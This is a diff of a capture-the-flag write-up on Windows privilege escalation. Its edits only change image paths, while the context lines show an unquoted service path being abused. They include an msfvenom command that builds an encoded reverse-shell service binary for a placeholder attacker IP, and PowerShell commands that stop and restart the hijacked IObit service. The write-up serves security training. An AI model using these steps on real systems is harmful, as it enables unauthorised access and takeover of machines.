@@ -240,12 +240,12 @@ Command to execute the script:
 .\winPEASx64.exe
 ```
 
-![[Attachments/Pasted image 20230913141953.png]]
+![[Website/assets/images/20230913141953.png]]
 
 Now lets take a look at our winPEAS scan. We can see that there is an Unquoted service path  that we have write access to `C:\Program Files (x86)\IObit\Advanced SystemCare\`.
 In that directory there is a service executable "ASCService.exe" that we can abuse by replacing this with a malicious file which will give us a reverse shell.
 
-![[Attachments/Pasted image 20230913142635.png]]
+![[Website/assets/images/20230913142635.png]]
  All we need to do is to create a windows reverse shell payload  using msfvenom and save it into a file with the same name as the service "ASSCService.exe". Then in order to upload and replace the legitimate file with our malicious payload file we need to first of all stop the **AdvancedSystemCareService9** service, then upload our payload into the same directory in order to overwrite the existing file.
 
 Let's first create our payload:
@@ -253,7 +253,7 @@ Let's first create our payload:
 msfvenom -p windows/shell_reverse_tcp LHOST=CONNECTION_IP LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o ASCService.exe
 ```
 
-![[Attachments/Pasted image 20230913100821.png]]
+![[Website/assets/images/20230913100821.png]]
  Now lets stop the **AdvancedSystemCareService9**:
 ```shell
 powershell -c "Stop-Service -Name 'AdvancedSystemCareService9' -Force"
@@ -276,9 +276,9 @@ powershell -c "Start-Service -Name 'AdvancedSystemCareService9'"
 
 and bingo! we have a shell.
 
-![[Attachments/Pasted image 20230913144245.png]]
+![[Website/assets/images/20230913144245.png]]
 
-![[Attachments/Pasted image 20230913144315.png]]
+![[Website/assets/images/20230913144315.png]]
 
-![](https://github.com/deusx7/deusx7.github.io/blob/main/assets/images/20230904204608.png)
+![](Website/assets/images/20230904204608.png)
 
